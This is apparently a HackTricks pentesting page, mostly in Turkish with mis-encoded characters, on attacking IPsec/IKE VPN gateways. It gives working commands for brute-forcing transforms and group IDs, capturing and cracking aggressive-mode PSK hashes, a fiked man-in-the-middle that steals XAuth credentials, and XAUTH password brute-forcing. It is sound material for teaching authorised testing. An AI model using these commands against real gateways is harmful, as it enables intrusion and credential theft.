# 500/udp - IPsec/IKE VPN Pentesting

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
{% endhint %}

## Temel Bilgiler

**IPsec**, aÄŸlar (LAN-to-LAN) arasÄ±nda ve uzaktan kullanÄ±cÄ±larÄ±n aÄŸ geÃ§idine (uzaktan eriÅŸim) iletiÅŸimini gÃ¼vence altÄ±na almak iÃ§in ana teknoloji olarak geniÅŸ Ã§apta tanÄ±nmaktadÄ±r ve kurumsal VPN Ã§Ã¶zÃ¼mlerinin belkemiÄŸini oluÅŸturmaktadÄ±r.

Ä°ki nokta arasÄ±nda bir **gÃ¼venlik iliÅŸkisi (SA)** kurulumu, kimlik doÄŸrulama ve anahtar deÄŸiÅŸimi iÃ§in tasarlanmÄ±ÅŸ bir protokol olan ISAKMP Ã§erÃ§evesinde Ã§alÄ±ÅŸan **IKE** tarafÄ±ndan yÃ¶netilmektedir. Bu sÃ¼reÃ§ birkaÃ§ aÅŸamada gerÃ§ekleÅŸir:

* **AÅŸama 1:** Ä°ki uÃ§ nokta arasÄ±nda gÃ¼venli bir kanal oluÅŸturulur. Bu, bir Ã–nceden PaylaÅŸÄ±lan Anahtar (PSK) veya sertifikalar kullanÄ±larak, Ã¼Ã§ mesaj Ã§iftini iÃ§eren ana mod veya **agresif mod** kullanÄ±larak gerÃ§ekleÅŸtirilir.
* **AÅŸama 1.5:** Zorunlu olmamakla birlikte, bu aÅŸama, baÄŸlantÄ± kurmaya Ã§alÄ±ÅŸan kullanÄ±cÄ±nÄ±n kimliÄŸini doÄŸrulamak iÃ§in bir kullanÄ±cÄ± adÄ± ve ÅŸifre gerektiren GeniÅŸletilmiÅŸ Kimlik DoÄŸrulama AÅŸamasÄ± olarak bilinir.
* **AÅŸama 2:** Bu aÅŸama, verileri **ESP** ve **AH** ile gÃ¼vence altÄ±na almak iÃ§in parametrelerin mÃ¼zakere edilmesine adanmÄ±ÅŸtÄ±r. **MÃ¼kemmel Ä°leri Gizlilik (PFS)** saÄŸlamak iÃ§in AÅŸama 1'deki algoritmalardan farklÄ± algoritmalarÄ±n kullanÄ±lmasÄ±na izin verir, gÃ¼venliÄŸi artÄ±rÄ±r.

**VarsayÄ±lan port:** 500/udp

## **nmap** kullanarak hizmeti keÅŸfedin
```
root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
```
## **GeÃ§erli bir dÃ¶nÃ¼ÅŸÃ¼m bulma**

IPSec yapÄ±landÄ±rmasÄ± yalnÄ±zca bir veya birkaÃ§ dÃ¶nÃ¼ÅŸÃ¼mÃ¼ kabul edecek ÅŸekilde hazÄ±rlanabilir. Bir dÃ¶nÃ¼ÅŸÃ¼m, deÄŸerlerin bir kombinasyonudur. **Her dÃ¶nÃ¼ÅŸÃ¼m**, DES veya 3DES gibi **ÅŸifreleme algoritmasÄ±**, SHA veya MD5 gibi **bÃ¼tÃ¼nlÃ¼k algoritmasÄ±**, Ã¶nceden paylaÅŸÄ±lan bir anahtar gibi **kimlik doÄŸrulama tÃ¼rÃ¼**, Diffie-Hellman 1 veya 2 gibi anahtar **daÄŸÄ±tÄ±m algoritmasÄ±** ve 28800 saniye gibi **Ã¶mÃ¼r** gibi bir dizi Ã¶zellik iÃ§erir.

O zaman, yapmanÄ±z gereken ilk ÅŸey **geÃ§erli bir dÃ¶nÃ¼ÅŸÃ¼m bulmak**, bÃ¶ylece sunucu sizinle iletiÅŸim kuracaktÄ±r. Bunu yapmak iÃ§in **ike-scan** aracÄ±nÄ± kullanabilirsiniz. VarsayÄ±lan olarak, Ike-scan ana modda Ã§alÄ±ÅŸÄ±r ve bir ISAKMP baÅŸlÄ±ÄŸÄ± ile birlikte bir paketi geÃ§ide gÃ¶nderir ve **iÃ§inde sekiz dÃ¶nÃ¼ÅŸÃ¼m bulunan** tek bir Ã¶neri gÃ¶nderir.

Cevaba baÄŸlÄ± olarak, uÃ§ nokta hakkÄ±nda bazÄ± bilgiler elde edebilirsiniz:
```
root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=d90bf054d6b76401)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
As you can see in the previous response, there is a field called **AUTH** with the value **PSK**. This means that the vpn is configured using a preshared key (and this is really good for a pentester).\
**Son satÄ±rÄ±n deÄŸeri de Ã§ok Ã¶nemlidir:**

* _0 dÃ¶nen el sÄ±kÄ±ÅŸma; 0 dÃ¶nen bildirim:_ Bu, hedefin **bir IPsec geÃ§idi olmadÄ±ÄŸÄ±nÄ±** gÃ¶sterir.
* _**1 dÃ¶nen el sÄ±kÄ±ÅŸma; 0 dÃ¶nen bildirim:**_ Bu, **hedefin IPsec iÃ§in yapÄ±landÄ±rÄ±ldÄ±ÄŸÄ±nÄ± ve IKE mÃ¼zakeresi yapmaya istekli olduÄŸunu, Ã¶nerdiÄŸiniz dÃ¶nÃ¼ÅŸÃ¼mlerden birinin veya daha fazlasÄ±nÄ±n kabul edilebilir olduÄŸunu** gÃ¶sterir (geÃ§erli bir dÃ¶nÃ¼ÅŸÃ¼m Ã§Ä±ktÄ±da gÃ¶sterilecektir).
* _0 dÃ¶nen el sÄ±kÄ±ÅŸma; 1 dÃ¶nen bildirim:_ VPN geÃ§itleri, **dÃ¶nÃ¼ÅŸÃ¼mlerin hiÃ§biri kabul edilebilir olmadÄ±ÄŸÄ±nda** bir bildirim mesajÄ± ile yanÄ±t verir (bazÄ± geÃ§itler bunu yapmaz, bu durumda daha fazla analiz ve revize edilmiÅŸ bir teklif denenmelidir).

Bu durumda zaten geÃ§erli bir dÃ¶nÃ¼ÅŸÃ¼mÃ¼mÃ¼z var, ancak 3. durumda iseniz, geÃ§erli bir dÃ¶nÃ¼ÅŸÃ¼m bulmak iÃ§in **biraz brute-force yapmanÄ±z gerekir:**

Ã–ncelikle tÃ¼m olasÄ± dÃ¶nÃ¼ÅŸÃ¼mleri oluÅŸturmanÄ±z gerekir:
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
Ve ardÄ±ndan her birini ike-scan kullanarak brute-force yapÄ±n (bu birkaÃ§ dakika sÃ¼rebilir):
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
EÄŸer brute-force iÅŸe yaramadÄ±ysa, belki de sunucu, geÃ§erli dÃ¶nÃ¼ÅŸÃ¼mlere bile el sÄ±kÄ±ÅŸmalarÄ± olmadan yanÄ±t veriyordur. O zaman, aynÄ± brute-force'u ama agresif mod kullanarak deneyebilirsiniz:
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
UmarÄ±m **geÃ§erli bir dÃ¶nÃ¼ÅŸÃ¼m geri yansÄ±tÄ±lÄ±r**.\
AynÄ± **saldÄ±rÄ±yÄ±** [**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) kullanarak deneyebilirsiniz.\
AyrÄ±ca dÃ¶nÃ¼ÅŸÃ¼mleri [**ikeforce**](https://github.com/SpiderLabs/ikeforce) ile kaba kuvvetle denemeyi de deneyebilirsiniz:
```bash
./ikeforce.py <IP> # No parameters are required for scan -h for additional help
```
![](<../.gitbook/assets/image (617).png>)

**DH Grubu: 14 = 2048-bit MODP** ve **15 = 3072-bit**\
**2 = HMAC-SHA = SHA1 (bu durumda). `--trans` formatÄ± $Enc,$Hash,$Auth,$DH**

Cisco, DH gruplarÄ± 1 ve 2'nin yeterince gÃ¼Ã§lÃ¼ olmadÄ±ÄŸÄ±nÄ± belirterek kullanÄ±lmamasÄ±nÄ± Ã¶neriyor. Uzmanlar, **kaynaklarÄ± bol olan Ã¼lkelerin bu zayÄ±f gruplarÄ± kullanan verilerin ÅŸifrelemesini kolayca kÄ±rabileceÄŸine** inanÄ±yor. Bu, kodlarÄ± hÄ±zlÄ± bir ÅŸekilde kÄ±rmaya hazÄ±rlayan Ã¶zel bir yÃ¶ntem kullanÄ±larak yapÄ±lÄ±r. Bu yÃ¶ntemi kurmanÄ±n maliyeti yÃ¼ksek olsa da, bu gÃ¼Ã§lÃ¼ Ã¼lkelerin, zayÄ±f bir grup (Ã¶rneÄŸin 1,024-bit veya daha kÃ¼Ã§Ã¼k) kullanÄ±yorsa ÅŸifrelenmiÅŸ verileri gerÃ§ek zamanlÄ± olarak okumalarÄ±na olanak tanÄ±r.

### Sunucu parmak izi alma

Daha sonra, cihazÄ±n **satÄ±cÄ±sÄ±nÄ± keÅŸfetmek** iÃ§in ike-scan kullanabilirsiniz. AraÃ§, bir baÅŸlangÄ±Ã§ Ã¶nerisi gÃ¶nderir ve tekrar oynamayÄ± durdurur. ArdÄ±ndan, sunucudan alÄ±nan **mesajlar** ile eÅŸleÅŸen yanÄ±t deseninin **zaman** farkÄ±nÄ± **analiz** ederek, pentester VPN geÃ§idi satÄ±cÄ±sÄ±nÄ± baÅŸarÄ±yla parmak izi alabilir. AyrÄ±ca, bazÄ± VPN sunucularÄ± IKE ile isteÄŸe baÄŸlÄ± **SatÄ±cÄ± KimliÄŸi (VID) yÃ¼kÃ¼nÃ¼** kullanacaktÄ±r.

**Gerekirse geÃ§erli dÃ¶nÃ¼ÅŸÃ¼mÃ¼ belirtin** (using --trans)

IKE, satÄ±cÄ±nÄ±n kim olduÄŸunu keÅŸfederse, bunu yazdÄ±racaktÄ±r:
```
root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=4f3ec84731e2214a)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

IKE Backoff Patterns:

IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator

Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
```
Bu, nmap script _**ike-version**_ ile de gerÃ§ekleÅŸtirilebilir.

## DoÄŸru ID'yi (grup adÄ±nÄ±) bulma

Hash'i yakalamak iÃ§in geÃ§erli bir dÃ¶nÃ¼ÅŸÃ¼m ve doÄŸru ID (grup adÄ±) gereklidir. GeÃ§erli grup adÄ±nÄ± muhtemelen bilemeyeceksiniz, bu yÃ¼zden bunu brute-force ile bulmanÄ±z gerekecek.\
Bunu yapmak iÃ§in size 2 yÃ¶ntem Ã¶neririm:

### ike-scan ile ID'yi brute-force yapmak

Ã–ncelikle, hash'i toplamaya Ã§alÄ±ÅŸarak sahte bir ID ile bir istek yapmayÄ± deneyin ("-P"):
```bash
ike-scan -P -M -A -n fakeID <IP>
```
EÄŸer **hiÃ§bir hash dÃ¶ndÃ¼rÃ¼lmÃ¼yorsa**, o zaman bu brute forcing yÃ¶ntemi muhtemelen iÅŸe yarayacaktÄ±r. **EÄŸer bazÄ± hash'ler dÃ¶ndÃ¼rÃ¼lÃ¼yorsa, bu sahte bir ID iÃ§in sahte bir hash'in geri gÃ¶nderileceÄŸi anlamÄ±na gelir, bu nedenle bu yÃ¶ntem ID'yi brute-force etmek iÃ§in gÃ¼venilir olmayacaktÄ±r.** Ã–rneÄŸin, sahte bir hash dÃ¶ndÃ¼rÃ¼lebilir (bu modern versiyonlarda olur):

![](<../.gitbook/assets/image (917).png>)

Ama dediÄŸim gibi, eÄŸer hiÃ§bir hash dÃ¶ndÃ¼rÃ¼lmÃ¼yorsa, o zaman ike-scan kullanarak yaygÄ±n grup adlarÄ±nÄ± brute-force etmeyi denemelisiniz.

Bu script **mÃ¼mkÃ¼n olan ID'leri brute-force etmeye Ã§alÄ±ÅŸacak** ve geÃ§erli bir el sÄ±kÄ±ÅŸma dÃ¶ndÃ¼rÃ¼len ID'leri geri dÃ¶ndÃ¼recektir (bu geÃ§erli bir grup adÄ± olacaktÄ±r).

EÄŸer belirli bir dÃ¶nÃ¼ÅŸÃ¼m keÅŸfettiyseniz, bunu ike-scan komutuna ekleyin. Ve eÄŸer birkaÃ§ dÃ¶nÃ¼ÅŸÃ¼m keÅŸfettiyseniz, hepsini denemek iÃ§in yeni bir dÃ¶ngÃ¼ eklemekten Ã§ekinmeyin (birisi dÃ¼zgÃ¼n Ã§alÄ±ÅŸana kadar hepsini denemelisiniz).

YaygÄ±n grup adlarÄ±nÄ± brute-force etmek iÃ§in [ikeforce sÃ¶zlÃ¼ÄŸÃ¼nÃ¼](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic) veya [seclists'teki](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt) birini kullanabilirsiniz:
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
Or use this dict (is a combination of the other 2 dicts without repetitions):

{% file src="../.gitbook/assets/vpnIDs.txt" %}

### Iker ile ID KÄ±rma

[**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) ayrÄ±ca olasÄ± grup adlarÄ±nÄ± kÄ±rmak iÃ§in **ike-scan** kullanÄ±r. **ike-scan Ã§Ä±ktÄ±sÄ±na dayanarak geÃ§erli bir ID bulmak iÃ§in** kendi yÃ¶ntemini izler.

### ikeforce ile ID KÄ±rma

[**ikeforce.py**](https://github.com/SpiderLabs/ikeforce) **ID'leri kÄ±rmak iÃ§in** kullanÄ±labilecek bir araÃ§tÄ±r. Bu araÃ§, **geÃ§erli ve geÃ§ersiz bir ID'yi ayÄ±rt etmek iÃ§in kullanÄ±labilecek farklÄ± zafiyetleri istismar etmeye Ã§alÄ±ÅŸacaktÄ±r** (yanlÄ±ÅŸ pozitifler ve yanlÄ±ÅŸ negatifler olabilir, bu yÃ¼zden mÃ¼mkÃ¼nse ike-scan yÃ¶ntemini kullanmayÄ± tercih ediyorum).

VarsayÄ±lan olarak **ikeforce**, sunucunun davranÄ±ÅŸÄ±nÄ± kontrol etmek ve kullanÄ±lacak taktiÄŸi belirlemek iÃ§in baÅŸlangÄ±Ã§ta bazÄ± rastgele ID'ler gÃ¶nderir.

* **Birinci yÃ¶ntem**, grup adlarÄ±nÄ± **araÅŸtÄ±rarak** **Dead Peer Detection DPD** bilgilerini kÄ±rmaktÄ±r (bu bilgi yalnÄ±zca grup adÄ± doÄŸruysa sunucu tarafÄ±ndan tekrar gÃ¶nderilir).
* **Ä°kinci yÃ¶ntem**, her denemeye gÃ¶nderilen yanÄ±t sayÄ±sÄ±nÄ± **kontrol etmektir** Ã§Ã¼nkÃ¼ bazen doÄŸru ID kullanÄ±ldÄ±ÄŸÄ±nda daha fazla paket gÃ¶nderilir.
* **ÃœÃ§Ã¼ncÃ¼ yÃ¶ntem**, yanlÄ±ÅŸ ID'ye yanÄ±t olarak **"INVALID-ID-INFORMATION"** aramaktÄ±r.
* Son olarak, sunucu kontrollerine hiÃ§bir yanÄ±t vermezse, **ikeforce** sunucuyu kÄ±rmaya Ã§alÄ±ÅŸacak ve doÄŸru ID gÃ¶nderildiÄŸinde sunucunun bazÄ± paketlerle yanÄ±t verip vermediÄŸini kontrol edecektir.\
AÃ§Ä±kÃ§a, ID'yi kÄ±rmanÄ±n amacÄ± geÃ§erli bir ID'ye sahip olduÄŸunuzda **PSK**'yÄ± elde etmektir. ArdÄ±ndan, **ID** ve **PSK** ile XAUTH'Ä± kÄ±rmanÄ±z gerekecek (eÄŸer etkinse).

Belirli bir dÃ¶nÃ¼ÅŸÃ¼m keÅŸfettiyseniz, bunu ikeforce komutuna ekleyin. Ve birden fazla dÃ¶nÃ¼ÅŸÃ¼m keÅŸfettiyseniz, hepsini denemek iÃ§in yeni bir dÃ¶ngÃ¼ eklemekten Ã§ekinmeyin (birinin dÃ¼zgÃ¼n Ã§alÄ±ÅŸana kadar hepsini denemelisiniz).
```bash
git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
```

```bash
./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
```
### Sniffing ID

(From the book **Network Security Assessment: Know Your Network**): VPN istemcisi ve sunucusu arasÄ±ndaki baÄŸlantÄ±yÄ± dinleyerek geÃ§erli kullanÄ±cÄ± adlarÄ± elde etmek de mÃ¼mkÃ¼ndÃ¼r, Ã§Ã¼nkÃ¼ istemci kimliÄŸini iÃ§eren ilk agresif mod paketi aÃ§Ä±k bir ÅŸekilde gÃ¶nderilmektedir.

![](<../.gitbook/assets/image (891).png>)

## Capturing & cracking the hash

Son olarak, eÄŸer **geÃ§erli bir dÃ¶nÃ¼ÅŸÃ¼m** ve **grup adÄ±** bulduysanÄ±z ve **agresif mod izin veriliyorsa**, o zaman kÄ±rÄ±labilir hash'i Ã§ok kolay bir ÅŸekilde elde edebilirsiniz:
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the passwor
```
Hash, _hash.txt_ dosyasÄ±na kaydedilecektir.

Hash'i **crack** etmek iÃ§in **psk-crack**, **john** ([**ikescan2john.py**](https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py) kullanarak) ve **hashcat** kullanabilirsiniz:
```bash
psk-crack -d <Wordlist_path> psk.txt
```
## **XAuth**

**Agresif mod IKE**, **Ã–nceden PaylaÅŸÄ±lan Anahtar (PSK)** ile birleÅŸtirildiÄŸinde, genellikle **grup kimlik doÄŸrulama** amaÃ§larÄ± iÃ§in kullanÄ±lÄ±r. Bu yÃ¶ntem, ek bir **kullanÄ±cÄ± kimlik doÄŸrulama** katmanÄ± eklemek iÃ§in **XAuth (GeniÅŸletilmiÅŸ Kimlik DoÄŸrulama)** ile gÃ¼Ã§lendirilmiÅŸtir. Bu tÃ¼r kimlik doÄŸrulama genellikle **Microsoft Active Directory**, **RADIUS** veya benzeri sistemler gibi hizmetleri kullanÄ±r.

**IKEv2**'ye geÃ§iÅŸte, kullanÄ±cÄ±larÄ± kimlik doÄŸrulamak amacÄ±yla **XAuth** yerine **EAP (GeniÅŸletilebilir Kimlik DoÄŸrulama ProtokolÃ¼)** kullanÄ±ldÄ±ÄŸÄ±na dair Ã¶nemli bir deÄŸiÅŸiklik gÃ¶zlemlenmektedir. Bu deÄŸiÅŸiklik, gÃ¼venli iletiÅŸim protokollerindeki kimlik doÄŸrulama uygulamalarÄ±nda bir evrimi vurgular.

### Yerel aÄŸ MitM ile kimlik bilgilerini yakalama

Bu nedenle, _fiked_ kullanarak giriÅŸ verilerini yakalayabilir ve varsayÄ±lan bir kullanÄ±cÄ± adÄ± olup olmadÄ±ÄŸÄ±nÄ± gÃ¶rebilirsiniz (IKE trafiÄŸini yakalamak iÃ§in `fiked`'e yÃ¶nlendirmeniz gerekir, bu ARP sahtekarlÄ±ÄŸÄ± yardÄ±mÄ±yla yapÄ±labilir, [daha fazla bilgi](https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/)). Fiked, bir VPN uÃ§ noktasÄ± olarak hareket edecek ve XAuth kimlik bilgilerini yakalayacaktÄ±r:
```bash
fiked -g <IP> -k testgroup:secretkey -l output.txt -d
```
AyrÄ±ca, IPSec kullanarak bir MitM saldÄ±rÄ±sÄ± yapmayÄ± deneyin ve tÃ¼m trafiÄŸi 500 numaralÄ± porta engelleyin, eÄŸer IPSec tÃ¼neli kurulamazsa belki trafik aÃ§Ä±k olarak gÃ¶nderilecektir.

### XAUTH kullanÄ±cÄ± adÄ± ve ÅŸifresini ikeforce ile brute-force yapmak

**XAUTH**'Ä± brute force yapmak iÃ§in (geÃ§erli bir grup adÄ± **id** ve **psk** bildiÄŸinizde) bir kullanÄ±cÄ± adÄ± veya kullanÄ±cÄ± adlarÄ± listesi ve bir ÅŸifreler listesi kullanabilirsiniz:
```bash
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
Bu ÅŸekilde, ikeforce her kullanÄ±cÄ± adÄ±:ÅŸifre kombinasyonunu kullanarak baÄŸlanmaya Ã§alÄ±ÅŸacaktÄ±r.

EÄŸer bir veya birkaÃ§ geÃ§erli dÃ¶nÃ¼ÅŸÃ¼m bulduysanÄ±z, bunlarÄ± Ã¶nceki adÄ±mlardaki gibi kullanÄ±n.

## IPSEC VPN ile Kimlik DoÄŸrulama

Kali'de, **VPNC** IPsec tÃ¼nelleri kurmak iÃ§in kullanÄ±lÄ±r. **profiller** `/etc/vpnc/` dizininde bulunmalÄ±dÄ±r. Bu profilleri _**vpnc**_ komutunu kullanarak baÅŸlatabilirsiniz.

AÅŸaÄŸÄ±daki komutlar ve yapÄ±landÄ±rmalar, VPNC ile bir VPN baÄŸlantÄ±sÄ± kurma sÃ¼recini gÃ¶stermektedir:
```bash
root@system:~# cat > /etc/vpnc/samplevpn.conf << STOP
IPSec gateway [VPN_GATEWAY_IP]
IPSec ID [VPN_CONNECTION_ID]
IPSec secret [VPN_GROUP_SECRET]
IKE Authmode psk
Xauth username [VPN_USERNAME]
Xauth password [VPN_PASSWORD]
STOP
root@system:~# vpnc samplevpn
VPNC started in background (pid: [PID])...
root@system:~# ifconfig tun0
```
In this setup:

* `[VPN_GATEWAY_IP]` ile VPN geÃ§idinin gerÃ§ek IP adresini deÄŸiÅŸtirin.
* `[VPN_CONNECTION_ID]` ile VPN baÄŸlantÄ±sÄ±nÄ±n tanÄ±mlayÄ±cÄ±sÄ±nÄ± deÄŸiÅŸtirin.
* `[VPN_GROUP_SECRET]` ile VPN'nin grup sÄ±rrÄ±nÄ± deÄŸiÅŸtirin.
* `[VPN_USERNAME]` ve `[VPN_PASSWORD]` ile VPN kimlik doÄŸrulama bilgilerini deÄŸiÅŸtirin.
* `[PID]` `vpnc` baÅŸlatÄ±ldÄ±ÄŸÄ±nda atanacak iÅŸlem kimliÄŸini simgeler.

VPN'i yapÄ±landÄ±rÄ±rken yer tutucularÄ± deÄŸiÅŸtirmek iÃ§in gerÃ§ek, gÃ¼venli deÄŸerlerin kullanÄ±ldÄ±ÄŸÄ±ndan emin olun.

## Reference Material

* [PSK cracking paper](http://www.ernw.de/download/pskattack.pdf)
* [SecurityFocus Infocus](http://www.securityfocus.com/infocus/1821)
* [Scanning a VPN Implementation](http://www.radarhack.com/dir/papers/Scanning\_ike\_with\_ikescan.pdf)
* Network Security Assessment 3rd Edition

## Shodan

* `port:500 IKE`

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
</details>
{% endhint %}
